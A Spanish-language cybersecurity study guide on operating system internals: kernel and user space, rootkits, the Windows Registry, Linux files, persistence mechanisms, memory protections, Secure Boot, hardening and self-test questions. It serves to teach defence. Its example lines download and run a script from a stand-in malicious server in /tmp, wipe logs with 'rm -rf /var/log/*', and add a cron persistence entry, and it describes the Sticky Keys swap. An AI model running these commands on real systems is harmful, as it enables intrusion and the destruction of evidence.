---
title: "Sistemas Operativos: El Administrador del Caos"
---

# Sistemas Operativos: El Administrador del Caos

## Objetivo de esta Guía

Entender por que el Sistema Operativo (OS) es la barrera más importante entre el hardware de la computadora y el mundo exterior, y como los atacantes abusan de sus reglas para tomar el control de una máquina.

El hardware por si solo no entiende que es un usuario, que es una contrasena o que es un archivo. Toda esa "ilusión" la crea el Sistema Operativo. Sin un sistema operativo, tu computadora seria un monton de silicio y metal inerte. El sistema operativo es el que organiza el caos: decide que programa se ejecuta cuando, que parte de la memoria le toca a cada quien, como se guardan los archivos en el disco, y quien tiene permiso para hacer cada cosa.

En esta guía vamos a abrir el capó de los dos sistemas operativos dominantes: Windows y Linux. No desde el punto de vista del usuario, sino desde el punto de vista del profesional de seguridad que necesita entender como se rompen y como se defienden.

---

## La Arquitectura Base: El Núcleo y sus Anillos

Si instalas un programa malicioso, por que este programa no puede simplemente decirle al hardware que queme el procesador o que borre todos los datos de los demás programas? La respuesta es el diseno de anillos de seguridad del sistema operativo.

### Kernel Space: El Núcleo

El kernel es el corazón del sistema operativo. Es el único codigo que tiene acceso directo y sin restricciones al hardware (CPU, memoria, disco, perifericos). Gestiona:

- La memoria: que proceso ocupa que dirección de RAM.
- Los procesos: que programa se ejecuta cuando, por cuanto tiempo.
- Los dispositivos: como se comunica el software con el teclado, el mouse, la tarjeta de red.
- El sistema de archivos: como se organizan y almacenan los datos en el disco.

**Si el kernel falla, falla todo el sistema.** Un error en el kernel causa un "kernel panic" en Linux o una "pantalla azul de la muerte" (BSOD) en Windows.

### User Space: Los Procesos Normales

Aqui viven los programas que usas a diario: el navegador web, el procesador de texto, el reproductor de musica, y también el malware. En user space, los programas no tienen acceso directo al hardware. No pueden escribir directamente en la memoria de otro proceso. No pueden enviar datos por la red sin pasar por el kernel.

**Para hacer algo que requiera acceso al hardware (leer un archivo, enviar un paquete de red, mostrar algo en pantalla), un proceso en user space debe hacer una "llamada al sistema" (syscall).** Es como enviar una carta formal al kernel pidiendo permiso. El kernel recibe la syscall, verifica si el proceso tiene los permisos necesarios, y si todo esta bien, ejecuta la operación en nombre del proceso.

### La Metafora del Castillo

Imagina un castillo medieval con un rey (el kernel) y ciudadanos (los procesos en user space):

- Los ciudadanos viven en la ciudad (user space). Pueden hacer cosas entre ellos (comunicarse entre procesos dentro de ciertos límites), pero no pueden cruzar el puente levadizo sin autorización del rey.
- Para entrar al castillo (ejecutar una operación privilegiada), el ciudadano debe presentar una solicitud formal (syscall) al guardia.
- El guardia revisa si el ciudadano tiene permiso (los permisos del usuario bajo el que corre el proceso).
- Si el rey confía en la solicitud, la ejecuta. Si no, la rechaza y puede expulsar al ciudadano (matar el proceso).

El castillo esta rodeado por un foso (la separacion entre kernel space y user space) que los programas normales no pueden cruzar.

### Modo Kernel vs Modo Usuario: La Diferencia Crítica

La CPU tiene un interruptor físico (lógico) que cambia entre modos. No es una simulación, es hardware real.

La CPU misma tiene soporte de hardware para esta separacion. Cuando la CPU esta en "modo kernel" (ring 0 en la arquitectura x86), puede ejecutar cualquier instrucción y acceder a cualquier dirección de memoria. Cuando esta en "modo usuario" (ring 3), las instrucciones privilegiadas están bloqueadas.

El sistema operativo cambia entre estos modos en cada syscall:
1. Un proceso en modo usuario necesita leer un archivo.
2. Hace una syscall (interrupción de software).
3. La CPU cambia a modo kernel.
4. El kernel verifica los permisos del proceso.
5. Si tiene permiso, el kernel lee el archivo.
6. La CPU vuelve a modo usuario.
7. El proceso recibe los datos.

Este cambio de modo no es trivial. Tiene un costo de rendimiento. Por eso las syscalls son más lentas que las llamadas a funciones normales.

### El Ángulo de Seguridad: Rootkits y el Kernel

Normalmente, el malware vive en user space. Un antivirus o un EDR (Endpoint Detection and Response), que corre con privilegios elevados pero en modo kernel o con acceso especial, puede detectar el malware porque el malware no puede esconderse del antivirus.

Pero existe una categoría de malware extremadamente peligroso: el rootkit. Un rootkit es un codigo malicioso que logra colarse dentro del kernel space. Cuando un atacante toma control del kernel:

- El rootkit puede mentirle a cualquier proceso en user space, incluyendo el antivirus.
- El rootkit puede interceptar syscalls. Cuando un programa pide "dame la lista de procesos," el rootkit responde "aqui tienes la lista, pero sin mi proceso" (ocultamiento).
- El rootkit puede acceder a cualquier dato en memoria, incluyendo claves de cifrado cargadas por otros programas.
- El rootkit puede modificar el comportamiento del sistema operativo a su antojo.

**Detectar un rootkit de kernel es extremadamente difícil** porque las herramientas que usarías para detectarlo (antivirus, comandos del sistema) ya están comprometidas. El rootkit les miente.

**Caso real: El rootkit de Sony (2005).** Sony BMG distribuyo millones de CDs de musica con un rootkit instalado automáticamente cuando reproducias el CD en tu computadora. El rootkit se ocultaba en el kernel de Windows para evitar que copiaras los CDs (protección de derechos de autor). Cuando se descubrió, fue un escandalo masivo: Sony había instalado software malicioso en los kernels de millones de computadoras sin consentimiento de los usuarios. El rootkit abria una vulnerabilidad que podía ser explotada por cualquier otro malware.

### Vulnerabilidades de Escalacion de Privilegios

El objetivo más común del malware no es entrar al kernel directamente (es muy difícil), sino explotar una vulnerabilidad que le permita pasar de user space a kernel space. Esto se llama "escalacion de privilegios locales" (Local Privilege Escalation, LPE).

**Como funciona:**
1. El atacante compromete una cuenta de usuario normal (via phishing, contrasena débil, etc.).
2. Desde esa cuenta, ejecuta un exploit que aprovecha una vulnerabilidad en el kernel o en un servicio que corre como SYSTEM/root.
3. El exploit le da acceso al kernel o a una cuenta de alta integridad (SYSTEM en Windows, root en Linux).
4. Ahora el atacante tiene control total de la máquina.

**Ejemplos clasicos de LPE:**
- CVE-2021-1732 (Windows): Vulnerabilidad en la funcion de ventanas de Windows que permitia a un usuario normal obtener privilegios de SYSTEM.
- CVE-2022-0847 (Dirty Pipe, Linux): Vulnerabilidad en el kernel de Linux que permitia a cualquier usuario escribir en archivos a los que no debería tener acceso, incluyendo archivos del sistema.

---

## Windows vs Linux: Dos Filosofías de Diseno

En ciberseguridad corporativa, te encontrarás con ambos sistemas. Windows domina los escritorios de las empresas y los servidores de Active Directory. Linux es el rey indiscutible de los servidores web, la infraestructura en la nube, los dispositivos IoT, y los sistemas embebidos. Entender sus diferencias de diseno es entender sus diferencias de seguridad.

### El Registro de Windows (Windows Registry)

Windows usa una base de datos jerárquica centralizada llamada el Registro para guardar casi toda su configuración. Esta organizado en "colmenas" (hives) y "llaves" (keys).

**Que se almacena en el Registro:**
- Configuración del sistema operativo.
- Configuración de programas instalados.
- Que programas arrancan al inicio del sistema (una de las llaves más atacadas).
- Historial de dispositivos conectados (USB, discos externos).
- Preferencias de usuario.
- Datos de sesión y contraseñas guardadas en caché.

**Donde están las colmenas principales:**
- `HKLM\Software`: Configuración global del software.
- `HKLM\System`: Configuración del sistema operativo.
- `HKCU\Software`: Configuración específica del usuario actual.
- `HKLM\SAM`: Base de datos de usuarios y contraseñas locales.

**El riesgo principal del Registro:**
- Si el Registro se corrompe, el sistema puede no arrancar.
- Los atacantes modifican llaves del Registro para lograr persistencia. Las llaves "Run" y "RunOnce" (en `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`) son las más conocidas: cualquier programa listado ahí se ejecuta automáticamente cuando un usuario inicia sesión.
- El Registro guarda un historial de dispositivos USB conectados. Esto es útil para forense (saber que USB se conecto a una máquina comprometida), pero los atacantes pueden borrar estas entradas.

**Caso real de abuso del Registro:** El malware Emotet modificaba entradas del Registro en `SOFTWARE\Microsoft\Windows\CurrentVersion\Run` para persistir después de reinicios. Además, usaba el Registro para almacenar su configuración cifrada (servidores de comando y control, listas de objetivos).

### La Filosofía de Linux: "Todo es un Archivo"

En Linux, no existe un Registro centralizado. Todo se maneja a través de archivos de texto plano en directorios específicos. La configuración del sistema, los servicios, los dispositivos de hardware, todo es representado como archivos.

**Que significa "todo es un archivo":**
- Los discos duros son archivos: `/dev/sda`, `/dev/nvme0n1`.
- Los procesos son archivos: `/proc/1234/`.
- La configuración del sistema son archivos: `/etc/ssh/sshd_config`, `/etc/nginx/nginx.conf`.
- Los logs son archivos: `/var/log/syslog`, `/var/log/auth.log`.
- Los dispositivos de entrada son archivos: `/dev/input/mouse0`.

**Ventaja de seguridad de "todo es un archivo":**
- Los permisos se aplican de manera uniforme. Si un atacante necesita modificar la configuración del servidor web, necesita permisos de escritura en `/etc/nginx/nginx.conf`. El sistema de permisos de Linux (chmod, chown) controla esto.
- No hay un único punto de fallo como el Registro de Windows. Si un archivo de configuración se corrompe, solo ese servicio se ve afectado.

**Desventaja de seguridad:**
- Si los permisos están mal configurados, la información queda expuesta.
- En sistemas Linux mal administrados, archivos críticos como `/etc/shadow` (que contiene los hashes de las contraseñas) pueden tener permisos demasiado permisivos.

**La clave `/etc/shadow` vs `/etc/passwd`:**
- `/etc/passwd`: Archivo legible por todos los usuarios. Contiene nombres de usuario, pero las contraseñas historicas se reemplazaron con una "x" que indica que la contrasena esta en `/etc/shadow`.
- `/etc/shadow`: Solo legible por root. Contiene los hashes de las contraseñas y las fechas de expiracion.
- Si un atacante logra leer `/etc/shadow`, puede intentar descifrar los hashes fuera de línea usando herramientas como John the Ripper o Hashcat.

---

## El Sistema de Archivos: NTFS vs ext4

Un disco duro vacio es solo un bloque de almacenamiento. Para poder guardar archivos y carpetas, el sistema operativo tiene que dibujar un mapa lógico encima del disco físico. A ese mapa se le llama sistema de archivos.

### NTFS (New Technology File System): El Estándar de Windows

NTFS es el sistema de archivos moderno de Windows. Reemplazo a FAT16/FAT32, que eran simples y no tenían seguridad.

**Características de seguridad de NTFS:**

**Permisos (ACLs):** NTFS permite definir permisos muy detallados por usuario o grupo sobre cada archivo o carpeta. Puedes decir: "Juan puede leer este archivo, Maria puede modificarlo, y el grupo de contabilidad no tiene acceso."

**Alternate Data Streams (ADS):** Una característica de NTFS que permite ocultar datos "detrás" de un archivo existente. Un archivo legítimo como `informe.txt` puede tener un stream oculto llamado `informe.txt:virus.exe`. Si abres `informe.txt`, solo ves el texto normal. Pero el archivo `virus.exe` esta ahí, oculto, dentro del mismo nombre de archivo.

**Ángulo de seguridad de ADS:** Los atacantes usan ADS para ocultar malware. Un script malicioso se descarga en un stream alternativo de un archivo legítimo. El usuario abre el archivo legítimo y no ve nada raro. Pero el atacante puede ejecutar el stream oculto cuando quiera. La mayoría de los usuarios (y muchas herramientas de seguridad) no revisan los ADS.

**Cifrado de archivos (EFS):** NTFS permite cifrar archivos individuales de forma transparente para el usuario. Solo el usuario que cifró el archivo puede leerlo.

**Compresion:** NTFS permite comprimir archivos y carpetas de forma transparente.

**Journaling:** NTFS mantiene un registro de cambios (journal) que permite recuperar el sistema de archivos si hay una falla eléctrica o un cuelgue del sistema.

### ext4 (Fourth Extended Filesystem): El Estándar de Linux

ext4 es el sistema de archivos más común en distribuciones de Linux.

**Diferencias clave con NTFS:**
- Los permisos son más simples: basados en "owner, group, others" (dueño, grupo, otros) con permisos de read, write, execute (lectura, escritura, ejecución). No tiene la granularidad de las ACLs de NTFS (aunque Linux también soporta ACLs con el comando setfacl para necesidades más finas).
- No tiene Alternate Data Streams. No hay forma nativa de ocultar datos detrás de un archivo.
- No tiene EFS. El cifrado se maneja a nivel de disco completo (LUKS) o con herramientas como eCryptfs o fscrypt.

**La simplicidad de los permisos de ext4:**

Cada archivo y carpeta tiene:
- Un dueño (owner): un usuario.
- Un grupo (group): un grupo de usuarios.
- Permisos para el dueño: r (read), w (write), x (execute).
- Permisos para el grupo: r, w, x.
- Permisos para otros: r, w, x.

**Ejemplo:** `-rwxr-xr-- 1 juan admin 1024 Jun 12 10:00 archivo.txt`
- `-`: es un archivo regular (d seria directorio).
- `rwx`: el dueño (juan) puede leer, escribir y ejecutar.
- `r-x`: el grupo (admin) puede leer y ejecutar, pero no escribir.
- `r--`: otros usuarios solo pueden leer.

**El error clásico de permisos en servidores Linux:** Un administrador ejecuta `chmod 777 -R /var/www/html` para que el servidor web pueda escribir archivos. Esto da permisos de lectura, escritura y ejecución a todos los usuarios del sistema. Si un atacante compromete cualquier cuenta en el servidor, puede modificar los archivos del sitio web (por ejemplo, inyectar un iframe malicioso en todas las páginas).

---

## Persistencia: Como Sobrevivir al Apagón

Imagina que un atacante logra ejecutar su codigo malicioso en la RAM de tu computadora. Sabe que cuando apagues el equipo, la RAM se borrará y el perderá el control. Para evitarlo, debe crear persistencia: obligar al sistema operativo a ejecutar su codigo automáticamente cada vez que la máquina arranque.

La persistencia es lo que separa un ataque temporal (que desaparece al reiniciar) de una infección permanente. La mayoría del malware moderno invierte mucho esfuerzo en establecer persistencia.

### Mecanismos de Persistencia en Windows

**Carpeta de Inicio (Startup Folder):** El atacante coloca un acceso directo a su malware en la carpeta de inicio del usuario o del sistema. Windows ejecuta automáticamente todo lo que esta en esa carpeta cuando el usuario inicia sesión.

**Run Keys del Registro:**
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` (para el usuario actual)
- `HKLM\Software\Microsoft\Windows\CurrentVersion\Run` (para todos los usuarios)
- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce` (se ejecuta una sola vez)

Cualquier programa listado en estas llaves se ejecuta automáticamente.

**Tareas Programadas (Scheduled Tasks):** Windows tiene un sistema de tareas programadas (Task Scheduler) que permite ejecutar programas en momentos específicos. Los atacantes crean tareas que ejecutan su malware cada vez que el sistema arranca o cada N minutos.

**Servicios (Services):** El atacante instala su malware como un servicio de Windows. Los servicios se inician automáticamente (o manualmente, según configuración) y corren en segundo plano, tipicamente con privilegios de SYSTEM.

**DLL Hijacking:** El atacante reemplaza una DLL (Dynamic Link Library) que un programa legítimo carga al iniciarse. Cuando el programa legítimo arranca, carga sin saberlo la DLL maliciosa. Esta técnica es particularmente difícil de detectar porque la DLL se carga dentro de un proceso legítimo.

### Mecanismos de Persistencia en Linux

**Cron:** Cron es el sistema de tareas programadas de Linux. El atacante añade una entrada en el crontab de un usuario o del sistema: `*/5 * * * * /tmp/malware.sh` (ejecutar el malware cada 5 minutos).

**Systemd:** Los sistemas Linux modernos usan systemd para gestionar servicios. El atacante crea un archivo de servicio systemd (`.service`) que ejecuta su malware y lo configura para que se inicie automáticamente en el arranque.

**Scripts de inicio (init.d, rc.local):** En sistemas más antiguos, los scripts en `/etc/init.d/` o comandos en `/etc/rc.local` se ejecutan al arrancar.

**Archivos de configuración de shell (bashrc, profile):** El atacante añade comandos a `/etc/bashrc`, `~/.bashrc` o `~/.profile`. Cada vez que un usuario abre una terminal, el shell ejecuta estos archivos.

**Kernel modules (LKM):** El atacante carga un modulo de kernel malicioso (Loadable Kernel Module). Esto le da acceso al kernel (rootkit) y es extremadamente difícil de detectar. Los LKM maliciosos son la forma más avanzada de persistencia en Linux.

### Donde Buscan los Analistas de Seguridad

Un analista de seguridad defensivo (blue team) conoce todos estos lugares de memoria. Cuando investiga un sistema potencialmente comprometido, revisa:

- Las Run Keys del Registro (Windows).
- Las tareas programadas.
- Los servicios instalados recientemente.
- Los archivos en la carpeta de inicio.
- Los cronjobs (Linux).
- Los servicios systemd.
- Los modulos de kernel cargados.
- Las conexiones de red activas (un proceso malicioso casi siempre se comunica con un servidor de comando y control).

**Herramientas que usan:** Autoruns (Sysinternals), Sysmon, osquery, auditd.

---

## Rutas Críticas: La Geografía de los Sistemas

Cada sistema operativo tiene directorios esenciales que todo profesional de seguridad debe conocer. Son los lugares donde vive la configuración, los ejecutables del sistema, los logs, y los datos de los usuarios.

### En Windows

**`C:\Windows\System32`:**
El corazón del sistema operativo Windows. Aqui viven los ejecutables, DLLs y controladores que Windows necesita para funcionar.
- `cmd.exe`: El interprete de comandos.
- `powershell.exe`: PowerShell.
- `notepad.exe`: Bloc de notas.
- `svchost.exe`: Host de servicios (un proceso que carga múltiples servicios de Windows).

**Riesgo de seguridad:** Si un archivo ajeno logra escribirse en System32, tienes un problema grave. Cualquier archivo en System32 puede ser ejecutado por cualquier usuario (esta en el PATH del sistema). Un atacante que coloque `sethc.exe` malicioso aqui puede obtener acceso administrativo presionando Shift 5 veces en la pantalla de login (Sticky Keys attack).

**El ataque de Sticky Keys:** En la pantalla de login de Windows, si presionas Shift 5 veces, se ejecuta `C:\Windows\System32\sethc.exe` (la herramienta de Sticky Keys). Un atacante con acceso físico puede arrancar la computadora, llegar a la pantalla de login, y reemplazar `sethc.exe` con `cmd.exe` usando herramientas de rescate. Luego, presionar Shift 5 veces abre una terminal con privilegios de SYSTEM.

**`C:\Users\`:**
Las carpetas de los usuarios.
- `C:\Users\[nombre]\AppData\Local`: Datos locales de aplicaciones. Lugar favorito del malware para esconderse porque los usuarios tienen permisos de escritura ahí.
- `C:\Users\[nombre]\AppData\Roaming`: Datos que sincronizan entre computadoras en un dominio.
- `C:\Users\[nombre]\Desktop`: El escritorio.
- `C:\Users\[nombre]\Downloads`: Descargas (origen común de infecciones).

**`C:\Program Files` y `C:\Program Files (x86)`:**
Donde se instalan las aplicaciones. Los usuarios normales no pueden escribir aqui (necesitan permisos de administrador).

**`C:\Windows\Temp` y `C:\Users\[nombre]\AppData\Local\Temp`:**
Directorios temporales. Cualquiera puede escribir aqui. Son usados constantemente por malware para descargar componentes adicionales o ejecutar scripts.

### En Linux

**`/etc/`:**
El directorio de configuración del sistema. Aqui viven los archivos de configuración de servicios, de red, de usuarios, y del sistema.
- `/etc/passwd`: Usuarios del sistema.
- `/etc/shadow`: Hashes de contraseñas (solo legible por root).
- `/etc/ssh/sshd_config`: Configuración del servidor SSH.
- `/etc/hosts`: Mapa de nombres de host a direcciones IP.
- `/etc/crontab`: Tareas programadas del sistema.
- `/etc/nginx/nginx.conf` o `/etc/apache2/apache2.conf`: Configuración del servidor web.

**Riesgo de seguridad:** Si un atacante modifica `/etc/shadow`, puede cambiar la contrasena de cualquier usuario. Si modifica `/etc/ssh/sshd_config`, puede permitir login como root por contrasena (una mala práctica). Si modifica `/etc/hosts`, puede redirigir el tráfico de un sitio web legítimo a un sitio malicioso (DNS poisoning local).

**`/var/log/`:**
El directorio de logs del sistema.
- `/var/log/syslog` o `/var/log/messages`: Log general del sistema.
- `/var/log/auth.log` o `/var/log/secure`: Log de autenticación.
- `/var/log/nginx/` o `/var/log/apache2/`: Logs del servidor web.
- `/var/log/kern.log`: Log del kernel.

**Riesgo de seguridad:** Un atacante intentará borrar o modificar estos archivos para cubrir sus huellas. Los comandos tipicos son `rm -rf /var/log/*` o `cat /dev/null > /var/log/auth.log`. Por eso los logs deben enviarse a un servidor centralizado de logs (syslog remoto).

**`/tmp/`:**
Directorio temporal. Todos los usuarios pueden escribir aqui. Es extremadamente común ver a atacantes descargar herramientas a `/tmp/` y ejecutarlas desde ahí, porque no requieren permisos especiales.

**Ejemplo típico de ataque:**
```
$ cd /tmp
$ wget http://malicious-server.com/exploit.sh
$ chmod +x exploit.sh
$ ./exploit.sh
```

**`/bin/`, `/sbin/`, `/usr/bin/`, `/usr/sbin/`:**
Directorios de ejecutables del sistema. Aqui viven los comandos básicos (ls, cp, mv, cat, ps, top, etc.).

**Riesgo de seguridad:** Un atacante puede reemplazar un comando legítimo como `ls` con una versión maliciosa que oculte sus archivos. Esto se llama "trojanizar" un binario. La próxima vez que el administrador ejecute `ls -la` para buscar archivos sospechosos, el `ls` malicioso simplemente no mostrará los archivos del atacante.

---

## Procesos y Memoria: Como el SO Organiza el Caos

Cada programa que se ejecuta es un proceso. El sistema operativo debe gestionar múltiples procesos que compiten por los mismos recursos (CPU, RAM, disco, red). Esta gestión es una de las funciones más importantes del kernel.

### Estados de un Proceso

Un proceso pasa por varios estados durante su vida:

- **Nuevo (New):** El proceso se esta creando.
- **Listo (Ready):** El proceso esta en RAM, esperando que la CPU este disponible.
- **Ejecutándose (Running):** La CPU esta ejecutando las instrucciones del proceso.
- **Bloqueado (Waiting):** El proceso espera un evento (que el disco lea datos, que llegue un paquete de red).
- **Terminado (Terminated):** El proceso ha finalizado.

### Planificacion (Scheduling)

La CPU solo puede ejecutar un proceso a la vez por núcleo. El planificador del kernel decide que proceso se ejecuta y por cuanto tiempo. Alterna entre procesos tan rápido (cientos o miles de veces por segundo) que parece que todos corren simultáneamente.

**Ángulo de seguridad:** Un atacante puede explotar la planificacion para realizar ataques de canal lateral. Midiendo cuanto tarda en ejecutar su proceso (debido a la contención por la caché de la CPU), puede inferir información sobre otros procesos que comparten la misma CPU.

### Memoria Virtual

Cada proceso cree que tiene su propio espacio de memoria privado, que va desde la dirección 0 hasta una dirección máxima. Esta es la "memoria virtual." El kernel traduce estas direcciones virtuales a direcciones físicas reales de RAM.

**Ventaja de seguridad:** Un proceso no puede acceder a la memoria de otro proceso. Si el navegador web tiene un fallo y escribe en una dirección de memoria inválida, solo el navegador se cuelga. No puede corromper la memoria del antivirus ni del sistema operativo.

**Como se rompe esta protección:**
- **Buffer overflow:** El atacante escribe más datos de los que caben en un buffer, sobrescribiendo memoria adyacente. Si logra sobrescribir la dirección de retorno de una funcion, puede redirigir la ejecución a su propio codigo.
- **Use-after-free:** El programa libera memoria pero sigue usando el puntero. El atacante logra que esa memoria liberada sea reasignada a otro objeto que el controla.
- **Race condition (TOCTOU):** El atacante explota la ventana entre que el sistema verifica un permiso y cuando ejecuta la accion.

### Protecciones Modernas de Memoria

Los sistemas operativos modernos implementan varias protecciones de memoria que hacen más difíciles estos ataques:

**ASLR (Address Space Layout Randomization):** El kernel coloca las regiones de memoria de cada proceso en posiciones aleatorias cada vez que se ejecuta. Un atacante no puede predecir donde estará el codigo o los datos, lo que hace más difícil explotar un buffer overflow.

**DEP/NX (Data Execution Prevention / No-Execute):** Las regiones de memoria están marcadas como ejecutables o no ejecutables. El stack y el heap (donde se almacenan datos) no son ejecutables. Si un atacante introduce codigo en el stack (buffer overflow), la CPU se niega a ejecutarlo.

**Stack Canaries:** Valores centinela colocados en el stack antes de la dirección de retorno. Si un buffer overflow sobrescribe el canary, el sistema detecta la alteracion y termina el programa antes de que el atacante tome control.

**CFG (Control Flow Guard en Windows) / CFI (Control Flow Integrity):** El sistema verifica que las llamadas a funciones solo vayan a destinos validos, no a cualquier dirección de memoria que el atacante haya preparado.

### Ataques que Burlan Estas Protecciones

Ninguna protección es perfecta:

- **Return-oriented programming (ROP):** El atacante no introduce codigo nuevo (eso lo bloquearia DEP). En lugar de eso, encadena fragmentos de codigo existente (gadgets) que terminan en instrucciones `ret` para construir la funcionalidad deseada.
- **ASLR bypass via information leak:** El atacante primero explota una vulnerabilidad de divulgación de información (por ejemplo, un error que lea memoria no autorizada) para descubrir la disposicion de memoria, y luego usa esa información para dirigir su exploit ROP.

---

## Arranque Seguro y Bootstrap: La Cadena de Confianza

El proceso de arranque es una cadena de confianza. Cada componente verifica la integridad del siguiente antes de cargarlo. Si esta cadena se rompe, el atacante puede tomar control de la máquina antes de que el sistema operativo arranque.

### UEFI y Secure Boot

UEFI (Unified Extensible Firmware Interface) reemplazo al clásico BIOS. Secure Boot es un mecanismo de UEFI que verifica que el bootloader (cargador de arranque) este firmado con una firma digital valida y confiable.

**La cadena de confianza de Secure Boot:**
1. El firmware UEFI verifica la firma del bootloader.
2. El bootloader (Windows Boot Manager, GRUB, shim) verifica la firma del kernel.
3. El kernel verifica la firma de los modulos del kernel y los controladores.

Si algún eslabón de la cadena no tiene la firma correcta, el arranque se detiene.

**Como se rompe Secure Boot:**
- Vulnerabilidades en el bootloader (BootHole, CVE-2020-10713): Una vulnerabilidad en GRUB permitia a un atacante con acceso local eludir Secure Boot incluso con las firmas válidas.
- Deshabilitacion de Secure Boot: En muchas placas madre, Secure Boot se puede deshabilitar desde la configuración del firmware. Un atacante con acceso físico puede deshabilitarlo.
- Enrollment de claves maliciosas: Si un atacante puede agregar su propia clave de firma a la base de datos de UEFI, puede arrancar codigo firmado por el mismo.

### Bootkits: Malware que Arranca Antes que el SO

Un bootkit es un tipo de rootkit que infecta el proceso de arranque. Se carga antes que el sistema operativo, lo que le permite:
- Ocultarse del sistema operativo y de cualquier herramienta de seguridad que corra sobre el.
- Mantener persistencia incluso si se reinstala el sistema operativo (porque el bootkit esta en el firmware o en el disco de arranque, no en la particion del sistema).
- Interceptar la carga del kernel y modificar su comportamiento.

**Ejemplos historicos de bootkits:**
- **TDL4 (Alureon):** Infectaba el Master Boot Record (MBR) de Windows. Cargaba su driver malicioso antes que Windows, dándole control total y capacidad de ocultarse.
- **BlackLotus (2023):** El primer bootkit que lograba eludir Secure Boot en sistemas completamente actualizados. Usaba una vulnerabilidad en el binario de arranque firmado de Windows (CVE-2022-21894) para cargar su codigo sin firmar.

---

## Hardening Básico: Como Endurecer un Sistema

El hardening (endurecimiento) es el proceso de reducir la superficie de ataque de un sistema. No existe un sistema invulnerable, pero si puedes hacer que sea mucho más difícil de comprometer.

### Principios Generales de Hardening

**Eliminar lo que no se necesita:** Cada programa, servicio, puerto abierto y usuario en el sistema es un posible punto de entrada. Si no necesitas un servicio, desinstalalo o desactivalo. Si no necesitas un puerto abierto, cierralo.

**Aplicar parches de seguridad:** Las vulnerabilidades se descubren constantemente. Los parches de seguridad son la defensa más efectiva contra exploits conocidos. Un sistema sin parchear es un sistema comprometido a corto o medio plazo.

**Principio de mínimo privilegio:** Ya lo vimos en las guías anteriores. Cada usuario y proceso debe tener solo los permisos que necesita.

**Configurar logs:** El sistema debe registrar eventos de seguridad (inicios de sesión, cambios en configuración, errores). Los logs deben enviarse a un servidor centralizado.

**Cifrado de disco completo:** Si te roban el disco físico, que no puedan leer los datos sin la contrasena de cifrado (BitLocker en Windows, LUKS en Linux).

### Hardening Específico de Windows

- Deshabilitar servicios innecesarios (Server, Print Spooler si no se usa, SMBv1).
- Configurar Windows Defender y mantenerlo actualizado.
- Habilitar User Account Control (UAC) en su nivel máximo.
- Configurar políticas de grupo (Group Policy) para restringir instalacion de software, acceso a USB, y ejecución de scripts.
- Deshabilitar PowerShell scripting para usuarios no administradores (Language Mode Constrained).
- Configurar Windows Firewall para bloquear todo el tráfico entrante excepto el necesario.

### Hardening Específico de Linux

- Configurar el firewall (iptables, nftables, ufw) para bloquear todo excepto los puertos necesarios.
- Deshabilitar login por contrasena para SSH y usar solo claves públicas.
- Deshabilitar login como root via SSH (`PermitRootLogin no` en `/etc/ssh/sshd_config`).
- Configurar fail2ban para bloquear IPs con múltiples intentos de login fallidos.
- Mantener el sistema actualizado (`apt update && apt upgrade` en Debian/Ubuntu, `yum update` en RHEL).
- Configurar SELinux o AppArmor en modo enforcing (no permissive).
- Usar `umask 027` para que los archivos nuevos no sean legibles por otros.
- Monitorear archivos críticos con AIDE o Tripwire.

---

## Autoevaluación: Criterio de Dominio

Puedes decir que entiendes los sistemas operativos desde el punto de vista de seguridad si puedes responder estas preguntas.

1. Estamos analizando un malware muy avanzado que ni el antivirus puede ver a pesar de estar activo. En que espacio (user space o kernel space) se instalo este malware? Que nombre recibe este tipo de malware y por que es tan difícil de detectar?

2. Un atacante quiere que su virus se ejecute cada vez que enciendes tu computadora con Windows. Nombra dos lugares del sistema (uno en el Registro, otro en el sistema de archivos) donde podría configurar esta persistencia.

3. En Linux, las configuraciones son archivos de texto. Por que un usuario normal no puede simplemente abrir `/etc/shadow` con un editor de texto y cambiar su contrasena? Explica el mecanismo de permisos que lo impide.

4. Que es el "ataque de Sticky Keys" en Windows? Por que funciona y que medida de hardening lo previene?

5. Un atacante compromete un servidor Linux y ejecuta un script que descarga herramientas en `/tmp/`. Por que elige `/tmp/` en lugar de otro directorio? Que principio de seguridad viola esta práctica?

6. Explica la diferencia entre un rootkit de kernel y un troyano que reemplaza un binario como `ls`. Cual es más difícil de detectar y por que?

7. Un administrador ejecuta `chmod 777 -R /var/www/html` en un servidor web. Que acaba de hacer exactamente y por que es peligroso? Que alternativa debería haber usado?

8. En el contexto de sistemas de archivos, explica que son los Alternate Data Streams (ADS) de NTFS y como los atacantes los usan para ocultar malware. Existe un equivalente en ext4?

9. Una empresa de comercio electrónico tiene su servidor web en Linux. El servidor de base de datos esta en Windows. Durante un ataque, el servidor web es comprometido via una vulnerabilidad en una aplicación PHP. Desde el servidor linux, el atacante intenta moverse lateralmente al servidor de base de datos Windows. Que servicios y puertos deberían estar bloqueados entre estos servidores para evitar este movimiento lateral?

10. Explica la funcion de SELinux/AppArmor en Linux. Es DAC o MAC? Por que un administrador novato tiende a deshabilitarlo y por que eso es un error?

---
